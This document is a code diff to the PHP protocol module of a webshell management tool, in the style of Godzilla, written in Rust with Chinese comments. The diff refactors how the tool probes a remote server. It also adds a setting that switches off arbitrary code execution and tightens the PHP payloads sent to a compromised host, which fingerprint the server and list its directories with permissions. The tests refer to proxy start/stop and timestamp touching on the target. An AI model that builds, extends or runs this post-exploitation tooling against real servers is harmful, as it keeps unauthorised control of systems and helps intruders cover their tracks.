@@ -241,6 +241,129 @@ pub fn clear_requests() {
 impl PhpProtocol {
     // --- Godzilla 分阶段载荷操作（xor_session） ---
 
+    /// P3：probe 内部实现，client 可复用（connect 传入已建 client，避免重复建连接池）。
+    fn probe_impl(
+        &self,
+        profile: &ShellProfile,
+        settings: &AppSettings,
+        reused_client: Option<&reqwest::blocking::Client>,
+    ) -> Result<ProbeResult, ProtocolError> {
+        // 环境信息探测：不产生任何文件系统副作用
+        let encoder = encoder_for(&profile.protocol_params);
+        if encoder.id().starts_with("native") {
+            // NATIVE 与自加密编码器恒走分阶段会话通道
+            let client = match reused_client {
+                Some(client) => client.clone(),
+                None => build_client(settings),
+            };
+            let php = PhpSession {
+                endpoint: profile.endpoint.clone(),
+                password: profile.password.clone(),
+                client,
+                encoder,
+                initialized: std::sync::Mutex::new(false),
+                session_mode: false,
+                cwd: std::sync::Mutex::new(String::new()),
+            };
+            return self.session_probe(&php, settings);
+        }
+        if session_mode_for(&profile.protocol_params, encoder) {
+            let client = match reused_client {
+                Some(client) => client.clone(),
+                None => build_client(settings),
+            };
+            let php = PhpSession {
+                endpoint: profile.endpoint.clone(),
+                password: profile.password.clone(),
+                client,
+                encoder,
+                initialized: std::sync::Mutex::new(false),
+                session_mode: true,
+                cwd: std::sync::Mutex::new(String::new()),
+            };
+            return self.session_probe(&php, settings);
+        }
+        let code = format!(
+            "{}\n$__r=array('ok'=>true,'data'=>array('server'=>php_uname('s').' '.php_uname('r').' '.php_uname('m'),'web_server'=>@$_SERVER['SERVER_SOFTWARE'],'php_version'=>PHP_VERSION,'current_dir'=>getcwd(),'separator'=>DIRECTORY_SEPARATOR,'php_sapi'=>PHP_SAPI,'arch'=>php_uname('m'),'extensions'=>array_slice(@get_loaded_extensions(),0,16),'disable_functions'=>(string)ini_get('disable_functions')));{}",
+            Self::build_prefix(encoder, &profile.password),
+            TEMPLATE_FRAME
+        );
+        let client = match reused_client {
+            Some(client) => client.clone(),
+            None => build_client(settings),
+        };
+        let value = self.send_frame(
+            &client,
+            &profile.endpoint,
+            &profile.password,
+            &code,
+            settings,
+            "probe",
+            encoder,
+        )?;
+
+        let server = value
+            .pointer("/data/server")
+            .and_then(|v| v.as_str())
+            .unwrap_or("未知")
+            .to_string();
+        let web_server = value
+            .pointer("/data/web_server")
+            .and_then(|v| v.as_str())
+            .unwrap_or("未知")
+            .to_string();
+        let runtime = value
+            .pointer("/data/php_version")
+            .and_then(|v| v.as_str())
+            .unwrap_or("未知")
+            .to_string();
+        let current_dir = value
+            .pointer("/data/current_dir")
+            .and_then(|v| v.as_str())
+            .unwrap_or("")
+            .to_string();
+        let separator = value
+            .pointer("/data/separator")
+            .and_then(|v| v.as_str())
+            .unwrap_or("/")
+            .to_string();
+        let php_sapi = value
+            .pointer("/data/php_sapi")
+            .and_then(|v| v.as_str())
+            .unwrap_or("")
+            .to_string();
+        let arch = value
+            .pointer("/data/arch")
+            .and_then(|v| v.as_str())
+            .unwrap_or("")
+            .to_string();
+        let extensions = value
+            .pointer("/data/extensions")
+            .and_then(|v| v.as_array())
+            .map(|a| a.iter().filter_map(|v| v.as_str().map(String::from)).collect())
+            .unwrap_or_default();
+        let disable_functions = value
+            .pointer("/data/disable_functions")
+            .and_then(|v| v.as_str())
+            .unwrap_or("")
+            .to_string();
+
+        Ok(ProbeResult {
+            status: "online".to_string(),
+            server,
+            web_server,
+            runtime,
+            current_dir,
+            separator,
+            message: "PHP 协议探测成功，返回真实环境信息。".to_string(),
+            php_sapi,
+            arch,
+            extensions,
+            disable_functions,
+            info: info_map(&value),
+        })
+    }
+
     fn session_probe(
         &self,
         php: &PhpSession,
@@ -684,6 +807,18 @@ impl Protocol for PhpProtocol {
                 "PHP 协议暂不支持 {language} 代码执行"
             )));
         }
+        // S1：任意代码执行安全闸 + 载荷长度上限（64KB）
+        if !settings.allow_arbitrary_code {
+            return Err(ProtocolError::NotSupported(
+                "run_code 任意代码执行已禁用（设置 allow_arbitrary_code=false）".into(),
+            ));
+        }
+        if code.len() > 64 * 1024 {
+            return Err(ProtocolError::NotSupported(format!(
+                "run_code 载荷超过长度上限（{} / 65536 字节）",
+                code.len()
+            )));
+        }
         // 1) 获取目标当前目录（写临时载荷用）
         let cwd = self
             .execute_command(session, "pwd 2>/dev/null", settings)?
@@ -749,109 +884,7 @@ impl Protocol for PhpProtocol {
         profile: &ShellProfile,
         settings: &AppSettings,
     ) -> Result<ProbeResult, ProtocolError> {
-        // 环境信息探测：不产生任何文件系统副作用
-        let encoder = encoder_for(&profile.protocol_params);
-        if encoder.id().starts_with("native") {
-            // NATIVE 与自加密编码器恒走分阶段会话通道
-            let php = PhpSession {
-                endpoint: profile.endpoint.clone(),
-                password: profile.password.clone(),
-                client: build_client(settings),
-                encoder,
-                initialized: std::sync::Mutex::new(false),
-                session_mode: false,
-                cwd: std::sync::Mutex::new(String::new()),
-            };
-            return self.session_probe(&php, settings);
-        }
-        if session_mode_for(&profile.protocol_params, encoder) {
-            let php = PhpSession {
-                endpoint: profile.endpoint.clone(),
-                password: profile.password.clone(),
-                client: build_client(settings),
-                encoder,
-                initialized: std::sync::Mutex::new(false),
-                session_mode: true,
-                cwd: std::sync::Mutex::new(String::new()),
-            };
-            return self.session_probe(&php, settings);
-        }
-        let code = format!(
-            "{}\n$__r=array('ok'=>true,'data'=>array('server'=>php_uname('s').' '.php_uname('r').' '.php_uname('m'),'web_server'=>@$_SERVER['SERVER_SOFTWARE'],'php_version'=>PHP_VERSION,'current_dir'=>getcwd(),'separator'=>DIRECTORY_SEPARATOR,'php_sapi'=>PHP_SAPI,'arch'=>php_uname('m'),'extensions'=>array_slice(@get_loaded_extensions(),0,16),'disable_functions'=>(string)ini_get('disable_functions')));{}",
-            Self::build_prefix(encoder, &profile.password),
-            TEMPLATE_FRAME
-        );
-        let client = build_client(settings);
-        let value = self.send_frame(
-            &client,
-            &profile.endpoint,
-            &profile.password,
-            &code,
-            settings,
-            "probe",
-            encoder,
-        )?;
-
-        let server = value
-            .pointer("/data/server")
-            .and_then(|v| v.as_str())
-            .unwrap_or("未知")
-            .to_string();
-        let web_server = value
-            .pointer("/data/web_server")
-            .and_then(|v| v.as_str())
-            .unwrap_or("未知")
-            .to_string();
-        let runtime = value
-            .pointer("/data/php_version")
-            .and_then(|v| v.as_str())
-            .unwrap_or("未知")
-            .to_string();
-        let current_dir = value
-            .pointer("/data/current_dir")
-            .and_then(|v| v.as_str())
-            .unwrap_or("")
-            .to_string();
-        let separator = value
-            .pointer("/data/separator")
-            .and_then(|v| v.as_str())
-            .unwrap_or("/")
-            .to_string();
-        let php_sapi = value
-            .pointer("/data/php_sapi")
-            .and_then(|v| v.as_str())
-            .unwrap_or("")
-            .to_string();
-        let arch = value
-            .pointer("/data/arch")
-            .and_then(|v| v.as_str())
-            .unwrap_or("")
-            .to_string();
-        let extensions = value
-            .pointer("/data/extensions")
-            .and_then(|v| v.as_array())
-            .map(|a| a.iter().filter_map(|v| v.as_str().map(String::from)).collect())
-            .unwrap_or_default();
-        let disable_functions = value
-            .pointer("/data/disable_functions")
-            .and_then(|v| v.as_str())
-            .unwrap_or("")
-            .to_string();
-
-        Ok(ProbeResult {
-            status: "online".to_string(),
-            server,
-            web_server,
-            runtime,
-            current_dir,
-            separator,
-            message: "PHP 协议探测成功，返回真实环境信息。".to_string(),
-            php_sapi,
-            arch,
-            extensions,
-            disable_functions,
-            info: info_map(&value),
-        })
+        self.probe_impl(profile, settings, None)
     }
 
     fn connect(
@@ -859,13 +892,14 @@ impl Protocol for PhpProtocol {
         profile: &ShellProfile,
         settings: &AppSettings,
     ) -> Result<(Box<dyn SessionState>, ProbeResult), ProtocolError> {
-        // 先探测验证密码与连通性，再建立会话
-        let result = self.probe(profile, settings)?;
+        // 先探测验证密码与连通性，再建立会话（探测与会话复用同一连接池）
+        let client = build_client(settings);
+        let result = self.probe_impl(profile, settings, Some(&client))?;
         let encoder = encoder_for(&profile.protocol_params);
         let session: Box<dyn SessionState> = Box::new(PhpSession {
             endpoint: profile.endpoint.clone(),
             password: profile.password.clone(),
-            client: build_client(settings),
+            client,
             encoder,
             initialized: std::sync::Mutex::new(false),
             session_mode: session_mode_for(&profile.protocol_params, encoder),
@@ -926,7 +960,7 @@ impl Protocol for PhpProtocol {
         }
         let path_b64 = B64.encode(path.as_bytes());
         let code = format!(
-            "{}\n$p=base64_decode('{path_b64}');$d=@scandir($p);if($d===false){{$__r=array('ok'=>false,'error'=>'无法读取目录');{} }}$out=array();foreach($d as $f){{if($f==='.'||$f==='..')continue;$full=$p.DIRECTORY_SEPARATOR.$f;$is_dir=is_dir($full);$out[]=array('name'=>$f,'path'=>$full,'is_dir'=>$is_dir,'size'=>$is_dir?0:filesize($full),'mtime'=>filemtime($full));}}$__r=array('ok'=>true,'data'=>array('entries'=>$out));{}",
+            "{}\n$p=base64_decode('{path_b64}');$d=@scandir($p);if($d===false){{$__r=array('ok'=>false,'error'=>'无法读取目录');{} }}$out=array();foreach($d as $f){{if($f==='.'||$f==='..')continue;$full=$p.DIRECTORY_SEPARATOR.$f;$s=@stat($full);$is_dir=is_dir($full);$out[]=array('name'=>$f,'path'=>$full,'is_dir'=>$is_dir,'size'=>($is_dir||$s===false)?0:$s['size'],'mtime'=>($s===false)?0:$s['mtime'],'perms'=>($s===false)?'':substr(sprintf('%o',$s['mode']&0777),-3));}}$__r=array('ok'=>true,'data'=>array('entries'=>$out));{}",
             Self::build_prefix(php.encoder, &php.password),
             TEMPLATE_FRAME_DIE,
             TEMPLATE_FRAME
@@ -1609,6 +1643,8 @@ mod tests {
             default_timeout_secs: 5,
             proxy: None,
             max_file_size_mb: 32,
+        chunk_size_mb: 4,
+        allow_arbitrary_code: true,
         }
     }
 
@@ -2393,6 +2429,33 @@ except Exception as e:
 "#;
 
     #[test]
+    fn run_code_disabled_gate() {
+        // S1：allow_arbitrary_code=false 时 run_code 拒绝执行任意代码
+        let Some((url, dir, mut child)) = spawn_php_server_with("native", "secret", false) else {
+            return;
+        };
+        let mut settings = settings();
+        settings.allow_arbitrary_code = false;
+        let mut profile1 = profile(&url);
+        profile1.protocol_params = r#"{"encoder":"native"}"#.to_string();
+        let result = (|| -> Result<(), ProtocolError> {
+            let (session, _) = PhpProtocol.connect(&profile1, &settings)?;
+            let php = session.as_any().downcast_ref::<PhpSession>().expect("会话类型不匹配");
+            let protocol = PhpProtocol;
+            let err = protocol
+                .run_code(php, "php", "<?php echo 1;", &settings)
+                .unwrap_err();
+            assert!(err.to_string().contains("已禁用"), "{err}");
+            eprintln!("[s1] run_code 门禁拒绝任意代码");
+            Ok(())
+        })();
+        let _ = child.kill();
+        let _ = child.wait();
+        let _ = std::fs::remove_dir_all(&dir);
+        result.unwrap_or_else(|error| panic!("run_code 门禁测试应成功：{error}"));
+    }
+
+    #[test]
     fn real_php_proxy_start_stop() {
         // Socks/HTTP 代理：start（后台驻留）→ stop（pid 文件 kill）闭环
         let Some((url, dir, mut child)) = spawn_php_server_with("native", "secret", false) else {
@@ -2479,7 +2542,9 @@ except Exception as e:
                 .map(|e| e.modified.clone())
                 .unwrap_or_default();
             assert_ne!(before_mtime, after_mtime, "touch 后 mtime 应改变：{before_mtime} -> {after_mtime}");
-            assert!(after_mtime.contains("2020-01-01") || after_mtime.starts_with("2020"), "应接近 2020-01-01：{after_mtime}");
+            // mtime 以本地时区显示（format_timestamp），不能用固定 "2020-01-01" 断言
+            let expected_mtime = format_timestamp(1_577_836_800);
+            assert_eq!(after_mtime, expected_mtime, "touch 后 mtime 应等于 2020-01-01（本地时区表示）：{after_mtime}");
             eprintln!("[touch] {before_mtime} -> {after_mtime}");
             Ok(())
         })();
